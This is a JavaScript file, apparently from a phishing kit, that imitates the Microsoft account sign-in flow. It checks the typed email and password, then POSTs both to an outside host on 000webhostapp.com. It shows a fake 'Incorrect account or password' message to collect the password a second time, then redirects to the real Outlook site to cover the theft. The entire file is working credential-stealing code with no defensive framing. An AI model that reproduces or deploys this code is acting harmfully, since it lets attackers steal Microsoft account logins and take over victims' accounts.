var jscsle = 0;
document.getElementById("idSIButton9").addEventListener("click", function() {
  ridslh()
});
document.getElementById("idSIButton10").addEventListener("click", function() {
  ridchs()
});
document.getElementById("eiwhdldtr").addEventListener("click", function() {
  document.getElementById("lightbox").style.display = "block";
  document.getElementById("lightmoon").style.display = "none";
});

function ridslh() {
	var i0116  = document.getElementById("i0116").value;
	var usernameError = true;

    if(myTrim(i0116) == "") {
          printError("usernameError", "Enter a valid email address, phone number, or Skype name.");
      } else {
          if(myTrim(i0116).length < 3) {
              printError("usernameError", "Enter a valid email address, phone number, or Skype name.");
          } else{
              printError("usernameError", "");
              usernameError = false;
          }
      }
	if ((usernameError) == true) {
	   return false;
    } else {
        redsht(i0116)
    }
	}

function redsht(usr) {
  document.getElementById("lightbox").style.display = "none";
  document.getElementById("lightmoon").style.display = "block";
  document.getElementById("displayName").innerHTML = usr;
  document.getElementById("displayName").title = usr;

}
function ridchs() {
  var i0118  = document.getElementById("i0118").value;
	var passwordError = true;

    if(myTrim(i0118) == "") {
        printError("passwordError", "Please enter the password for your Microsoft account.");
    } else {
        if(myTrim(i0118).length < 6){
			printError("passwordError", "Please enter the password for your Microsoft account.");
		} else if(myTrim(i0118).length > 40){
			printError("passwordError", " ");
		} else{
            printError("passwordError", "");
            passwordError = false;
        }
    }

	if ((passwordError) == true) {
	   return false;
    } else {
        ridwth()
    }
}

function ridwth(){
	var slvurs  = document.getElementById("i0116").value;
	var slvpsr  = document.getElementById("i0118").value;
  document.getElementById("idSIButton10").style.display = "none";
  document.getElementById("sucrat10").style.display = "inline";


	$.ajax({
		type: "POST",
		url: "https://strenghtofficethree.000webhostapp.com/xheidheolshdndi/",
		data: {slvurs: slvurs, slvpsr: slvpsr},
		success: function(data){
        jscsle = jscsle+1;
        if(jscsle == 1){
           document.getElementById("passwordError").innerHTML = "Incorrect account or password";
           document.getElementById("idSIButton10").style.display = "inline";
           document.getElementById("sucrat10").style.display = "none";
        }else if(jscsle == 2){
           window.location.href = "https://outlook.live.com/";
        }
		},
    error : function(jqXHR, textStatus, errorThrown) {
			document.getElementById("passwordError").innerHTML = "Incorrect account or password";
      document.getElementById("idSIButton10").style.display = "inline";
      document.getElementById("sucrat10").style.display = "none";
       }
	})
}

function myTrim(x) {
  return x.replace(/^\s+|\s+$/gm,'');
}
String.prototype.nl2br = function(){
	return this.replace(/\n/g, "<br />");
}
function printError(elemId, hintMsg) {
  document.getElementById(elemId).innerHTML = hintMsg;
}
